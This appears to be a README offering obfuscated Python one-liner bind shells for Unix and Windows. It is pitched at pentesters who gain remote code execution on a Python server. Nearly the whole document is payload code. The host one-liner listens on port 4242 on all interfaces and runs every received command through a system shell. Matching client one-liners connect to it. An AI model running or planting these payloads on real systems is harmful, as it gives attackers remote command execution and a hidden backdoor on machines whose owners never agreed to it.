# Python one-liner bind shell
A python bind shell single line code for both Unix and Windows. This special useful for pentester when they found an RCE in a python server but they can't create a new file. Also adminstrator will able to create a bind shell to server with just a single code very simple.


# Payloads:
## The host command (to create a bind shell):
### Unix:

```
python -c "(lambda __g, __y, __contextlib: [[[[(s.bind(('0.0.0.0', 4242)), (s.listen(5), [[(lambda __after: [__after() for __g['f'] in [(('\nShell\\%s> ' % u))]][0] if (os.name == 'nt') else [__after() for __g['f'] in [(('%s@shell:$ ' % u))]][0])(lambda: (c.send(f), (lambda __after: __y(lambda __this: lambda: (lambda __break: [(lambda __after: __break() if (d == 'exit') else __after())(lambda: (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: (c.send(('%s%s' % (b, f))), __this())[1])][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and ([True for __out[0] in [([lambda after: after() for __g['b'] in [('')]][0])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [([(lambda __after: __after()) for __g['b'] in [(subprocess.check_output(d, stderr=subprocess.STDOUT, shell=True))]][0])]][0]})())))([None])) for __g['d'] in [(c.recv(1024).decode().replace('\n', ''))]][0])(__after) if 1 else __after())())(lambda: None))[1]) for __g['u'] in [(subprocess.check_output('whoami', stderr=subprocess.STDOUT, shell=True).replace('\n', ''))]][0] for (__g['c'], __g['a']) in [(s.accept())]][0])[1])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), __import__('contextlib', level=0))"
```

### Windows:

```
py -c "(lambda __g, __y, __contextlib: [[[[(s.bind(('0.0.0.0', 4242)), (s.listen(5), [[(lambda __after: [__after() for __g['f'] in [(('\nShell\\%s> ' % u))]][0] if (os.name == 'nt') else [__after() for __g['f'] in [(('%s@shell:$ ' % u))]][0])(lambda: (c.send(f), (lambda __after: __y(lambda __this: lambda: (lambda __break: [(lambda __after: __break() if (d == 'exit') else __after())(lambda: (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: (c.send(('%s%s' % (b, f))), __this())[1])][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and ([True for __out[0] in [([lambda after: after() for __g['b'] in [('')]][0])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [([(lambda __after: __after()) for __g['b'] in [(subprocess.check_output(d, stderr=subprocess.STDOUT, shell=True))]][0])]][0]})())))([None])) for __g['d'] in [(c.recv(1024).decode().replace('\n', ''))]][0])(__after) if 1 else __after())())(lambda: None))[1]) for __g['u'] in [(subprocess.check_output('whoami', stderr=subprocess.STDOUT, shell=True).replace('\n', ''))]][0] for (__g['c'], __g['a']) in [(s.accept())]][0])[1])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), __import__('contextlib', level=0))"
```



## The client command (to connect to the shell):
### Unix:
#### Python 2:

```
python -c "(lambda __g, __y: [[[(s.connect((t, 4242)), (lambda __after: __y(lambda __this: lambda: (lambda __break: [[(s.send(b.encode()), (lambda __after: __break() if (b == 'exit') else __after())(lambda: __this()))[1] for __g['b'] in [(raw_input(d))]][0] for __g['d'] in [(s.recv(2048).decode())]][0])(__after) if 1 else __after())())(lambda: None))[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['t'] in [(raw_input('Host: '))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))"
```

#### Python 3:

```
python3 -c "(lambda __g, __y: [[[(s.connect((t, 4242)), (lambda __after: __y(lambda __this: lambda: (lambda __break: [[(s.send(b.encode()), (lambda __after: __break() if (b == 'exit') else __after())(lambda: __this()))[1] for __g['b'] in [(input(d))]][0] for __g['d'] in [(s.recv(2048).decode())]][0])(__after) if 1 else __after())())(lambda: None))[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['t'] in [(input('Host: '))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))"
```


### Windows:
#### Python2:

```
py -c "(lambda __g, __y: [[[(s.connect((t, 4242)), (lambda __after: __y(lambda __this: lambda: (lambda __break: [[(s.send(b.encode()), (lambda __after: __break() if (b == 'exit') else __after())(lambda: __this()))[1] for __g['b'] in [(raw_input(d))]][0] for __g['d'] in [(s.recv(2048).decode())]][0])(__after) if 1 else __after())())(lambda: None))[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['t'] in [(raw_input('Host: '))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))"
```

#### Python 3:

```
py -c "(lambda __g, __y: [[[(s.connect((t, 4242)), (lambda __after: __y(lambda __this: lambda: (lambda __break: [[(s.send(b.encode()), (lambda __after: __break() if (b == 'exit') else __after())(lambda: __this()))[1] for __g['b'] in [(input(d))]][0] for __g['d'] in [(s.recv(2048).decode())]][0])(__after) if 1 else __after())())(lambda: None))[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['t'] in [(input('Host: '))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))"
```

